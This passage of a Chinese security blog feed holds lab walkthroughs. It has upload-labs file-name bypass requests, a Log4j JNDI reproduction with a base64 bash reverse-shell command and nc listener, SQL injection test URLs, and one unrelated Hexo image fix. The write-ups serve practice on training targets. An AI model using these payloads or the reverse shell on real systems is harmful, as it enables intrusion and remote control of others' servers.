class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=07</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">19718198955447</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php &quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">19718198955447</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">19718198955447</span>--</span><br></pre></td></tr></table></figure><p>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-18-16-23.png"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p><strong>服务端-强黑名单检查-改包加 . 绕过</strong><br>漏洞点主要在这</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure><p>strrchr<br>(PHP 4, PHP 5, PHP 7, PHP 8)<br>strrchr — 查找指定字符在字符串中的最后一次出现<br>strrchr(string $haystack, mixed $needle): string<br>该函数返回 haystack 字符串中的一部分，这部分以 needle 的最后出现位置开始，直到 haystack 末尾。  </p><p>所以尾端加了<code>.</code>之后就被认为后缀为<code>.</code>绕过了黑名单，但是windows会把<code>1.php.</code>改成<code>1.php</code>，linux暂未测试，待补</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">217261477111538</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php.&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">217261477111538</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">217261477111538</span>--</span><br></pre></td></tr></table></figure><p>稍微修一下后端代码，把识别的后缀显示出来，回显得<br><code>&lt;br&gt;后缀.后缀&lt;br&gt;</code><br>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-20-29-44.png"></p><p>参考：  </p><p><a href="https://www.php.net/manual/zh/function.strrchr.php">strrchr</a></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>服务端-强黑名单检查-改包加 ::$DATA绕过</strong> </p><p>在window下<code>::$DATA</code>之后会认为是文件流，假如<code>1.php::$DATA </code>，则其后缀被认为是.php<br>所以我们就可以构造一个<code>1.php::$DATA</code>，来绕过</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload/upload-labs/Pass-09/index.php</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">287032381131322</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">287032381131322</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">287032381131322</span>--</span><br></pre></td></tr></table></figure><p>修改后端，看到中间数据得流动</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>file_ext:.php::$data<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>temp_file:C:\Windows\php67CE.tmp<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>img_path../upload/202202282241383659.php::$data<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问图片<br><img src="/2022/02/28/upload-labs/2022-02-28-22-45-56.png"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><strong>服务端-强黑名单检查-改包加 <code>. .</code> 绕过</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>可以使用<code>1.php. .</code> 这个方式绕过</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">30333176734664</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php. .&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">30333176734664</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">30333176734664</span>--</span><br></pre></td></tr></table></figure><p>访问<br><img src="/2022/02/28/upload-labs/2022-02-28-23-13-35.png"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><strong>服务端-强黑名单检查-双写绕过</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p>后端直接替换掉了关键字，而且是忽略大小的<br>使用双写绕过</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">15141771128253</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.pphphp&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">15141771128253</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">15141771128253</span>--</span><br></pre></td></tr></table></figure><p>访问</p><p><img src="/2022/02/28/upload-labs/2022-02-28-23-20-04.png"></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><strong>服务端-白名单检查-GET %00截断绕过</strong>   </p><p>%00截断利用需要有以下条件</p><blockquote><p>php版本小于5.3.4<br>php的magic_quotes_gpc为OFF状态   </p></blockquote><p>所以这使用PHP5.2.17<br>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/upload-labs/Pass-<span class="number">12</span>/index.php?save_path=../upload/<span class="number">1.</span>php%<span class="number">00</span> HTTP/<span class="number">1.1</span></span><br><span class="line">…………</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">326623275720037</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.png&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">326623275720037</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">326623275720037</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为<code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>以及%00又是截断符，所以img_path变成了..&#x2F;upload&#x2F;1.php </p><p>然后因为使用的是<code>move_uploaded_file($temp_file,$img_path))</code>，所以把1.png放进了..&#x2F;upload&#x2F;1.php，成功绕过</p><p><img src="/2022/02/28/upload-labs/2022-02-28-23-38-11.png"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j 远程代码执行</title>
      <link href="/2022/02/24/Apache-Log4j-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/02/24/Apache-Log4j-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>平台：vulfocus<br>工具：JNDI-Injection-Exploit</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><strong>准备本地攻击环境</strong><br>准备使用JNDI-Injection-Exploit反弹shell<br>构建shell<br><img src="https://img-blog.csdnimg.cn/7905a992254f45b6b45f4f1fc5a910b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开JNDI-Injection-Exploit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="string">&quot;0.0.0.0&quot;</span></span><br></pre></td></tr></table></figure><p>得到<strong>JNDI links</strong>，备好一会放在burp里面</p><p>监听9999端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 9999</span><br></pre></td></tr></table></figure><p><strong>在vulfocus打开在线靶机环境</strong><br><img src="https://img-blog.csdnimg.cn/c2993a2c056f41a8b51d61ceb816dac3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>抓包，根据提示更改包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /hello HTTP/1.1</span><br><span class="line">Host: vulfocus.fofa.so:63137</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 54</span><br><span class="line"></span><br><span class="line">payload=<span class="variable">$&#123;jndi:rmi://0.0.0.0/xgr2vd&#125;</span><span class="comment">#刚刚备好的JNDI links</span></span><br></pre></td></tr></table></figure><p>发动过去就得到反弹shell了，找到flag，一般在tmp<br><img src="https://img-blog.csdnimg.cn/a68e0274250f49e2856a0476d4c0fd8a.png" alt="在这里插入图片描述"></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>JNDI-exploit原理</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://vulfocus.fofa.so/">vulfocus在线环境</a><br><a href="https://ylcao.top/2021/12/apache-log4j2-rce%E5%A4%8D%E7%8E%B0/">Apache log4j2 rce复现</a><br><a href="https://www.cxyzjd.com/article/qq_40007043/107615314">漏洞复现系列–fastjson＜&#x3D;1.2.47反序列化漏洞_梦之旅行地-程序员宅基地</a><br><a href="https://x.hacking8.com/java-runtime.html">java命令执行payloads</a><br><a href="https://chowdera.com/2021/12/202112102325553772.html">Apache Log4j 2 远程代码执行漏洞（反弹shell）</a><br><a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases">JNDI-Injection-Exploit</a><br><a href="http://dnslog.cn/">http://dnslog.cn/</a><br><a href="https://www.cnblogs.com/Icedisaster/p/15675313.html">浅谈最近闹得火热的Log4j RCE漏洞</a><br><a href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce">CVE-2021-44228(Apache Log4j Remote Code Execution）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo预览失败问题浅解</title>
      <link href="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/"/>
      <url>/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo预览失败问题浅解"><a href="#hexo预览失败问题浅解" class="headerlink" title="hexo预览失败问题浅解"></a>hexo预览失败问题浅解</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>在<code>VScode</code>上使用<code>Paste Image</code>插件,本地预览没有问题，本地预览不显示。原因位于hexo本身并不处理图片给定的图片路径，但是博客post下的文件会根据时间更改路径，导致出错。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>1、修改博客根目录<code>_config.yml</code>文件的配置项<code>post_asset_folder</code>为<code>true</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true <span class="comment">#在新建博文时，同目录下创建同名文件夹，为存放图片做准备</span></span><br></pre></td></tr></table></figure><p>2、修改<code>Paste Image</code>设置，保证文件存储到同名文件夹。</p><p><img src="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/2022-02-19-13-44-29.png">  </p><p>打开 <code>extension setting</code>，点击打开setting.json  </p><p><img src="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/2022-02-19-13-47-41.png"></p><p>添加如下两条：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;pasteImage.path&quot;</span>: <span class="string">&quot;$&#123;currentFileNameWithoutExt&#125;&quot;</span>,</span><br><span class="line"><span class="string">&quot;pasteImage.insertPattern&quot;</span>: <span class="string">&quot;$&#123;imageSyntaxPrefix&#125;./$&#123;currentFileNameWithoutExt&#125;/$&#123;imageFileName&#125;$&#123;imageSyntaxSuffix&#125;&quot;</span>,</span><br></pre></td></tr></table></figure><p>第一条保存照片到同名文件夹，第二条保存图片url为相对路径，方便配合后面的插件</p><p>3、安装插件</p><p>该插件可以把图片放在博文同名文件夹下，并修改图片访问路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>最后，可以快乐的复制粘贴了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/ea78bdd0551f">解决Hexo博客不显示图片的一种方法</a><br><a href="https://tanjuntao.github.io/2019/04/28/%E8%A7%A3%E5%86%B3hexo%E4%B8%AD%E5%8F%91%E5%B8%83%E6%96%87%E7%AB%A0%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/">解决hexo中发布文章后图片无法显示的问题</a><br><a href="https://github.com/mushanshitiancai/vscode-paste-image/blob/master/src/extension.ts">Paste Image</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> un_problems </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2022/02/17/sqli-labs/"/>
      <url>/2022/02/17/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs通关浅解"><a href="#sqli-labs通关浅解" class="headerlink" title="sqli-labs通关浅解"></a>sqli-labs通关浅解</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p><strong>level-1报错型-字符型 注入</strong></p><p>1、在url后边加入GET参数id，并故意添加单引号，测试是否存在简单注入点，得到报错，说明存在注入点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1256e96460c247a984fc8ca70620a95b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>2、判断字符还是整型注入。<br>测试如下url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>回显正常，说明为<strong>字符型</strong></p><p>原因</p><p><strong>字符型</strong>：where id&#x3D;’1 and 1&#x3D;2’，在引号内，遇到空格停止读取，等效于where id &#x3D;’1’。</p><p><strong>整型</strong>：where id&#x3D;1 and 1&#x3D;2，逻辑上会报错。</p><p>3、判断字段数。<br><a href="https://www.w3school.com.cn/sql/sql_orderby.asp">ORDER BY 语句用于对结果集进行排序。</a><br>显示的有三个信息，所以猜测有三个，判断字段数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan 1</span><br><span class="line">Your Login name:Dumb 2</span><br><span class="line">Your Password:Dumb 3</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; order by 3%23 正常</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27;</span> order by <span class="number">4</span>%<span class="number">23</span> 会报错，Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span>，所以有三个字段</span><br></pre></td></tr></table></figure><p>4、爆数据库、表、字段和其他数据<br><a href="https://www.runoob.com/sql/sql-union.html">SQL UNION 操作符合并两个或多个 SELECT 语句的结果。</a></p><p>大白话：可以利用该特性进行个性化查询。</p><p>（1）爆数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,3%23</span></span><br></pre></td></tr></table></figure><p><img 